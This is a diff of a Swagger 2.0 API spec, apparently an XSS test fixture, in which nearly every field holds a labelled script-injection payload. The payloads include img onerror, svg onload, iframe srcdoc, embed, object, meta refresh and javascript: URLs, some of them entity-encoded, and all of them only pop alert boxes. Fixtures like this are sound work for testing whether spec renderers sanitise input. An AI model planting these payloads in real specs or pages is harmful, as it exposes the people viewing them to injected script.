@@ -1,56 +1,76 @@
 swagger: '2.0'
 info:
-  title: <img src=x onerror=alert('XSS-Title')>
-  description: <img src=x onerror=alert('XSS-Description')>
+  title: "&lt;img src=x onerror=alert('XSS-Title-HTML-Entity')&gt;"
+  description: <img src=x onerror=alert('XSS-Description-Direct')>
   version: 1.0.0
-  termsOfService: <img src=x onerror=alert('XSS-TOS')>
+  termsOfService: "&lt;svg onload=alert('XSS-TOS-Entity')&gt;"
   contact:
-    name: <img src=x onerror=alert('XSS-Contact-Name')>
+    name: "&lt;img src=x onerror=alert('XSS-Contact-Entity')&gt;"
     email: test@example.com
-    url: http://example.com
+    url: "javascript:alert('XSS-Contact-URL')"
   license:
-    name: <img src=x onerror=alert('XSS-License-Name')>
-    url: http://example.com
-host: <img src=x onerror=alert('XSS-Host')>
+    name: "&lt;iframe srcdoc='&lt;script&gt;top.alert(\"XSS-License-Iframe\")&lt;/script&gt;'&gt;"
+    url: "javascript:alert('XSS-License-URL')"
+host: "javascript:alert('XSS-Host-JS')"
 basePath: /
 schemes:
   - http
-consumes:
-  - application/json
-produces:
-  - application/json
 tags:
-  - name: <img src=x onerror=alert('XSS-Tag-Name')>
-    description: <img src=x onerror=alert('XSS-Tag-Description')>
+  - name: "&lt;img src=x onerror=alert('XSS-Tag-Entity')&gt;"
+    description: <svg onload=alert('XSS-TagDesc-Direct')>
 paths:
   /test:
     get:
-      summary: <img src=x onerror=alert('XSS-Summary')>
-      description: <img src=x onerror=alert('XSS-Path-Description')>
-      operationId: <img src=x onerror=alert('XSS-OperationId')>
+      summary: "&lt;img src=x onerror=alert('XSS-Summary-Entity')&gt;"
+      description: <iframe srcdoc='<script>top.alert("XSS-Path-Iframe")</script>'>
+      operationId: "javascript:alert('XSS-OperationId-JS')"
       parameters:
-        - name: <img src=x onerror=alert('XSS-Parameter-Name')>
+        - name: "&lt;img src=x onerror=alert('XSS-Param-Entity')&gt;"
           in: query
-          description: <img src=x onerror=alert('XSS-Parameter-Description')>
+          description: <img src=x onerror=alert('XSS-ParamDesc-Direct')>
           required: false
           type: string
       responses:
         200:
-          description: <img src=x onerror=alert('XSS-Response-200')>
+          description: "&lt;svg onload=alert('XSS-Response200-Entity')&gt;"
         400:
-          description: <img src=x onerror=alert('XSS-Response-400')>
+          description: <embed src="javascript:alert('XSS-Response400-Embed')">
+  /xss:
+    get:
+      summary: "JavaScript URI Test"
+      description: "Click the link for XSS"
+      parameters:
+        - name: "redirect"
+          in: query
+          description: <a href="javascript:alert('XSS-Param-Link')">Click me</a>
+          required: false
+          type: string
+      responses:
+        302:
+          description: <meta http-equiv="refresh" content="0;url=javascript:alert('XSS-Meta-Refresh')">
 definitions:
-  TestObject:
+  XSSObject:
     type: object
     properties:
       id:
         type: integer
-        description: <img src=x onerror=alert('XSS-Property-Description')>
+        description: "&lt;img src=x onerror=alert('XSS-Prop-Entity')&gt;"
       name:
         type: string
-        example: <img src=x onerror=alert('XSS-Example')>
-    title: <img src=x onerror=alert('XSS-Definition-Title')>
-    description: <img src=x onerror=alert('XSS-Definition-Description')>
+        example: "&lt;svg onload=alert('XSS-Example-Entity')&gt;"
+      link:
+        type: string
+        example: "javascript:alert('XSS-Example-JS')"
+    title: <object data="javascript:alert('XSS-Definition-Object')">
+    description: "&lt;iframe srcdoc='&lt;script&gt;top.alert(\"XSS-Definition-Iframe\")&lt;/script&gt;'&gt;"
 externalDocs:
-  description: <img src=x onerror=alert('XSS-ExternalDocs')>
-  url: http://example.com
+  description: "&lt;img src=x onerror=alert('XSS-External-Entity')&gt;"
+  url: "javascript:alert('XSS-External-URL')"
+securityDefinitions:
+  apiKey:
+    type: apiKey
+    name: "&lt;img src=x onerror=alert('XSS-Security-Name')&gt;"
+    in: header
+    description: "&lt;svg onload=alert('XSS-Security-Desc')&gt;"
+security:
+  - apiKey: []
